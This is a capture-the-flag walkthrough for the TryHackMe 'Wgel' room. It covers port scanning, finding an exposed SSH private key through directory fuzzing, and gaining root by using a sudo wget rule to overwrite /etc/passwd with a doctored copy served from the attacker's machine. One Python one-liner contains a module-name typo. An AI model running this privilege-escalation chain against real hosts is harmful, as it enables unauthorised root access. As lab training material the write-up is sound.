---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Wgel
# DESCRIPTION       . Can you exfiltrate the root flag?
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/wgelctf
```

```
sudo nmap -sSVC -T5 10.10.28.223 -p- -oN wgel
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94961b66801b7648682d14b59a01aaaa (RSA)
|   256 18f710cc5f40f6cf92f86916e248f438 (ECDSA)
|_  256 b90b972e459bf32a4b11c7831033e0ce (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- After wandering around the webpage - which is the default apache page - we find the following comment in the source code

```
 <!-- Jessie don't forget to udate the webiste -->
```

- So we got one potential username. After fuzzing, we find the `/sitemap` directory which seems to contain the main web app.

- There wasn't anything useful around here, just a web template.

- I spent some time trying to find vulnerabilities in the contact form, but I had no luck.

- I decided I must've missed something, so I fuzzed the `/sitemap` directory again, this time using another dictionary: `dirb's common.txt`.

- This time, the results were better :) 

```
.ssh                    [Status: 301, Size: 319, Words: 20, Lines: 10]
```

- Inside it's a `id_rsa` private key that will allow us to connect as `jessie` on the box.

```bash
sudo -l

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

- However, we're limited only to `wget` as we don't know jessie's password.

- I tried to escalate privileges using GTFO payload, but surprisingly it didn't work.

- I used `cat /etc/passwd` on the target and copied the output to a local file on my box.

- Then, I've used `python3 -c 'import crypy; print(crypt.crypt("password"))'` to generate a new hash and replaced the `x` for `root` with the hash generated. 

- With the altered passwd file in the directory, I've started a webserver using python: `python3 -m http.server 80`

- Then, from the target, I used `sudo wget http://ip/passwd -O /etc/passwd` ; since we can use it as sudo, why not replace the actual file :) 

- `su root` -> insert password :) 

- First flag is in `/home/jessie/Documents/user_flag.txt`
- Second flag is in `/root/root_flag.txt`.

